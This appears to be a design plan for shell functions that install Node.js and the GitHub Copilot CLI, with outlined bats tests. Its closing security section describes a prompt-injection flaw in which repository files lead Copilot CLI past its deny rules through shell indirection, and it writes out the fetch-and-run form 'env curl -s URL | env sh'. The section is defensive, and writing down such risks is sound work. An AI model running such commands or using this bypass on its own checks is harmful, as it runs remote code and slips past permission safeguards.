## Background: What is `copilot`?

- Package: `@github/copilot` on the npm registry (current stable: `0.0.420`)
- Binary: a Node.js wrapper script — **requires Node.js to run**
- Install: `npm install -g @github/copilot`
- There is no standalone native binary; `brew install copilot` installs the unrelated AWS
  Copilot CLI

## Dependency Chain (Refined)

```
_ensure_copilot_cli()
    └── _ensure_node()                        # prerequisite — node + npm
            ├── _command_exist node → return 0
            ├── _command_exist brew → _run_command -- brew install node  # Universal (macOS + Linuxbrew)
            ├── Debian/Ubuntu       → apt-get install -y nodejs npm
            ├── RedHat/Fedora/RHEL  → dnf/yum install -y nodejs npm
            └── _install_node_from_release()  # direct download fallback
                    └── https://nodejs.org/dist/vX.Y.Z/node-vX.Y.Z-<os>-<arch>.tar.gz
                        → extract to ~/.local, add ~/.local/bin to PATH
    └── _run_command --prefer-sudo -- npm install -g @github/copilot
```

`_ensure_node` remains a first-class, reusable function.

## Implementation Details

### `_ensure_node()`

Discovery priority honors existing codebase patterns while adding "Universal Brew" detection:
1. **Existing**: `_command_exist node` → return 0.
2. **Brew (Universal)**: If `_command_exist brew` succeeds, run `_run_command -- brew install node`. This covers macOS and Linux users with Linuxbrew.
3. **Debian family**: `_run_command --prefer-sudo -- apt-get install -y nodejs npm`.
4. **RedHat family**: `_run_command --prefer-sudo -- dnf install -y nodejs npm` (fallback to `yum`).
5. **Direct Binary**: `_install_node_from_release` → extract to `~/.local`.

### `_ensure_copilot_cli()`

1. `_command_exist copilot` → return 0.
2. `_ensure_node` guarantee.
3. `_run_command --prefer-sudo -- npm install -g @github/copilot`.
   - Note: `--prefer-sudo` ensures we handle both user-owned (Brew) and root-owned (System) npm global directories seamlessly.
4. `_command_exist copilot` verification.

## Test Cases

### `ensure_node.bats` (mirrors `ensure_bats.bats` structure)

1. No-op when `node` already installed — no commands run
2. Installs via `brew install node` on macOS (brew available)
3. Installs via `apt-get install nodejs npm` on Debian

1. No-op when `copilot` already installed — `_ensure_node` never called
2. Calls `_ensure_node` then `npm install -g @github/copilot` when `copilot` missing

## Security Considerations

**Do not pass live credentials to Copilot CLI via `--secret-env-vars`.**

A known prompt injection vulnerability allows malicious content in repository files (READMEs, docs)
to bypass Copilot's deny rules using shell indirection (`env curl -s URL | env sh`). Since `env`
is allowlisted, the regex validator does not flag the wrapped commands.

In our workflow, Copilot's role is **file generation only** — writing stub shell files and bats
tests. It requires no cluster access, no Vault token, and no kubeconfig. Credentials must never
be injected.

Reference: https://dev.to/matthewhou/github-copilot-cli-executes-malware-with-zero-approval-your-cicd-pipeline-would-have-caught-it-4g19
